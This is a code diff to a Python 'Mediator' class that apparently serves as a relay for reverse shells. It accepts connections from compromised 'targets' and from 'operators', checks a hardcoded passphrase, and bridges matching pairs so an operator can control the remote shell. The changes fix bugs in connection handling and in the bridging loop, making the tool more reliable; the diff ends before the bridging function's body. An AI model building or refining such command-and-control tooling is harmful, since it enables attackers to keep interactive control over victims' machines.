@@ -24,7 +24,7 @@ class Mediator:
         # queue and match incoming connections
         self.targets = {}
         self.operators = {}
-        # tell sockets to listen on respective ports for a max of 1 connection
+        # tell sockets to listen on respective ports for a max of 4 connections
         self.targetServer.listen(4)
         self.operatorServer.listen(4)
         self.connCount = 0
@@ -42,48 +42,70 @@ class Mediator:
         targetHandler.start()
         operatorHandler.start()
         bridgeWorker.start()
+        # wait for keyboard interrupt
+        waiter = threading.Event()
+        try:
+            waiter.wait()
+        except KeyboardInterrupt:
+            exit()
 
     def handleTargets(self):
         while True:
             # wait for reverse shell to connect 
             targetConnection, targetAddress = self.targetServer.accept()
+            print("Target connection initiated from {}".format(targetAddress[0]))
             targetKey = None
             # validate connection is from our reverse shell
-            ready = select.select([self.targetServer], [], [], 5)
+            ready = select.select([targetConnection], [], [], 5)
             if ready[0]:
                 targetKey = targetConnection.recv(1024)
-            if targetKey:
-                if targetKey.decode() != "I solemnly swear that I am up to no good.":
-                    continue
-            else:
+            if not targetKey:
+                print("No connection key sent by target {}... Closing connection".format(targetAddress[0]))
+                print("Value of targetKey:", targetKey)
+                targetConnection.close()
+                continue
+            if targetKey.decode() != "I solemnly swear that I am up to no good.":
+                print("Invalid connection key sent by target {}... Closing connection".format(targetAddress[0]))
+                targetConnection.close()
                 continue
             # add connection to queue
             self.targets[targetKey.decode()] = targetConnection
-            print("Reverse shell connected from {}...".format(targetConnection.getpeername()[0]))
+            print("Reverse shell connected from {}...".format(targetAddress[0]))
 
     def handleOperators(self):
         while True:
             # wait for operator to connect
             operatorConnection, operatorAddress = self.operatorServer.accept()
+            print("Operator connection initiated from {}".format(operatorAddress[0]))
             operatorKey = None
-            ready = select.select([self.operatorServer], [], [], 5)
+            ready = select.select([operatorConnection], [], [], 5)
             if ready[0]:
                 operatorKey = operatorConnection.recv(1024)
-            if operatorKey:
-                if operatorKey.decode() != "I solemnly swear that I am up to no good.":
-                    continue
-            else:
+            if not operatorKey:
+                print("No connection key sent by operator {}... Closing connection".format(operatorAddress[0]))
+                print("Value of operatorKey:", operatorKey)
+                operatorConnection.close()
+                continue
+            if operatorKey.decode() != "I solemnly swear that I am up to no good.":
+                print("Invalid connection key sent by operator {}... Closing connection".format(operatorAddress[0]))
+                operatorConnection.close()
                 continue
             # add connection to queue
             self.operators[operatorKey.decode()] = operatorConnection
-            print("Operator connected from {}...".format(operatorConnection.getpeername()[0]))
+            print("Operator connected from {}...".format(operatorAddress[0]))
 
     def bridgeConnections(self):
         while True:
-            for connectionKey, operatorConnection in self.operators.items():
+            # search for matching connection keys
+            for connectionKey in list(self.operators):
                 if connectionKey in self.targets:
+                    # bridge connections with matching keys
+                    operatorConnection = self.operators[connectionKey]
                     targetConnection = self.targets[connectionKey]
-                self.applyBlackMagic(operatorConnection, targetConnection)
+                    self.applyBlackMagic(operatorConnection, targetConnection)
+                    # remove connections from matching queue
+                    self.operators.pop(connectionKey)
+                    self.targets.pop(connectionKey)
 
     def applyBlackMagic(self, operatorConnection, targetConnection):
         # connect the streams with GNU black magic
